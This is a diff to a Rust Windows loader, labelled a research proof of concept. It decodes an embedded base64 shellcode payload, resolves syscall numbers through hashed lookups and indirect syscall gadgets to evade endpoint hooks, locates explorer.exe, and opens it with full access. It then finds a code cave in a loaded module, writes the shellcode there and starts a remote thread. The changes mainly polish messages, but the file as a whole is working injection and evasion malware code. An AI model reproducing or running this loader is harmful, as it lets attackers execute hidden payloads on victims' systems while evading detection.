@@ -10,7 +10,7 @@ use windows_sys::Win32::Foundation::*;
 
 /*
     ================================================================================
-    2026 STEALTH LOADER - FINAL ROBUST EDITION
+    ULTIMATE 2026 RESEARCH PoC: ROBUST REMOTE MODULE STOMPING & INDIRECT SYSCALLS
     ================================================================================
 */
 
@@ -120,24 +120,24 @@ unsafe fn find_ssn_and_gadget(ntdll: *mut c_void, h: u32) -> Option<(u32, usize)
 // --- Main Program ---
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("[*] 2026 Advanced Stealth Loader");
+    println!("[*] Final 2026 Stealth Loader Refined PoC");
     let payload_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
     let shellcode = general_purpose::STANDARD.decode(payload_b64)?;
 
     unsafe {
-        let ntdll = get_local_module(dbj2("ntdll.dll")).expect("ntdll failed");
-        let (ssn_open, gadget) = find_ssn_and_gadget(ntdll, dbj2("NtOpenProcess")).expect("open ssn failed");
-        let (ssn_read, _) = find_ssn_and_gadget(ntdll, dbj2("NtReadVirtualMemory")).expect("read ssn failed");
-        let (ssn_write, _) = find_ssn_and_gadget(ntdll, dbj2("NtWriteVirtualMemory")).expect("write ssn failed");
-        let (ssn_protect, _) = find_ssn_and_gadget(ntdll, dbj2("NtProtectVirtualMemory")).expect("protect ssn failed");
-        let (ssn_thread, _) = find_ssn_and_gadget(ntdll, dbj2("NtCreateThreadEx")).expect("thread ssn failed");
-        let (ssn_query, _) = find_ssn_and_gadget(ntdll, dbj2("NtQuerySystemInformation")).expect("query ssn failed");
-        let (ssn_proc, _) = find_ssn_and_gadget(ntdll, dbj2("NtQueryInformationProcess")).expect("proc ssn failed");
+        let ntdll = get_local_module(dbj2("ntdll.dll")).expect("ntdll resolution failed");
+        let (ssn_open, gadget) = find_ssn_and_gadget(ntdll, dbj2("NtOpenProcess")).expect("NtOpenProcess SSN failed");
+        let (ssn_read, _) = find_ssn_and_gadget(ntdll, dbj2("NtReadVirtualMemory")).expect("NtReadVirtualMemory SSN failed");
+        let (ssn_write, _) = find_ssn_and_gadget(ntdll, dbj2("NtWriteVirtualMemory")).expect("NtWriteVirtualMemory SSN failed");
+        let (ssn_protect, _) = find_ssn_and_gadget(ntdll, dbj2("NtProtectVirtualMemory")).expect("NtProtectVirtualMemory SSN failed");
+        let (ssn_thread, _) = find_ssn_and_gadget(ntdll, dbj2("NtCreateThreadEx")).expect("NtCreateThreadEx SSN failed");
+        let (ssn_query, _) = find_ssn_and_gadget(ntdll, dbj2("NtQuerySystemInformation")).expect("NtQuerySystemInformation SSN failed");
+        let (ssn_proc, _) = find_ssn_and_gadget(ntdll, dbj2("NtQueryInformationProcess")).expect("NtQueryInformationProcess SSN failed");
 
         let mut buffer = vec![0u8; 1024 * 1024];
         let mut len = 0u32;
         let mut st = sys_call(ssn_query, gadget, 5, buffer.as_mut_ptr() as usize, buffer.len(), &mut len as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
-        if st != 0 { return Err("Query failed".into()); }
+        if st != 0 { return Err(format!("Query failed: 0x{:x}", st).into()); }
 
         let mut exp_pid: HANDLE = null_mut();
         let mut offset = 0;
@@ -150,13 +150,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             if (*info).NextEntryOffset == 0 { break; }
             offset += (*info).NextEntryOffset as usize;
         }
-        if exp_pid.is_null() { return Err("Explorer not found".into()); }
+        if exp_pid.is_null() { return Err("Target not found".into()); }
+        println!("[+] Target found: PID {}", exp_pid as usize);
 
         let mut h_proc: HANDLE = null_mut();
         let mut oa = OBJECT_ATTRIBUTES { Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32, RootDirectory: null_mut(), ObjectName: null_mut(), Attributes: 0, SecurityDescriptor: null_mut(), SecurityQualityOfService: null_mut() };
         let mut cid = CLIENT_ID { UniqueProcess: exp_pid, UniqueThread: null_mut() };
         st = sys_call(ssn_open, gadget, &mut h_proc as *mut _ as usize, 0x1FFFFF, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
-        if st != 0 || h_proc.is_null() { return Err("Open failed".into()); }
+        if st != 0 || h_proc.is_null() { return Err(format!("Open failed: 0x{:x}", st).into()); }
 
         let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
         sys_call(ssn_proc, gadget, h_proc as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>(), 0, 0, 0, 0, 0, 0, 0);
@@ -167,6 +168,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let mut curr_link = ldr_copy.InLoadOrderModuleList.Flink;
         let mut cave_addr = 0usize;
+        println!("[*] Searching for code cave in explorer.exe...");
+
         while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY {
             let mut entry: LDR_DATA_TABLE_ENTRY = std::mem::zeroed();
             sys_call(ssn_read, gadget, h_proc as usize, curr_link as usize, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), 0, 0, 0, 0, 0, 0, 0);
@@ -174,7 +177,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, n_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
             let name = String::from_utf16_lossy(&n_buf).to_lowercase();
 
-            if !name.contains("ntdll") && !name.contains("kernel") {
+            if !name.contains("ntdll") && !name.contains("kernel") && !name.contains("gdi") && !name.contains("user32") {
                 let mut dos: IMAGE_DOS_HEADER = std::mem::zeroed();
                 sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
                 let mut nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
@@ -200,8 +203,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             if cave_addr != 0 { break; }
             curr_link = entry.InLoadOrderLinks.Flink;
         }
-        if cave_addr == 0 { return Err("Cave failed".into()); }
-        println!("[+] Injection Target: 0x{:x}", cave_addr);
+        if cave_addr == 0 { return Err("Cave failure".into()); }
+        println!("[+] Found Cave: 0x{:x}", cave_addr);
 
         let mut base = cave_addr as *mut c_void;
         let mut sz = shellcode.len();
@@ -213,10 +216,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let mut h_th: HANDLE = null_mut();
         st = sys_call(ssn_thread, gadget, &mut h_th as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
         if st == 0 && !h_th.is_null() {
-            println!("[+] Execution Started.");
-            windows_sys::Win32::System::Threading::WaitForSingleObject(h_th, 0xFFFFFFFF);
+            println!("[+] Success.");
         } else {
-            println!("[-] Exec failed: 0x{:x}", st);
+            println!("[-] Trigger failed: 0x{:x}", st);
         }
     }
     Ok(())
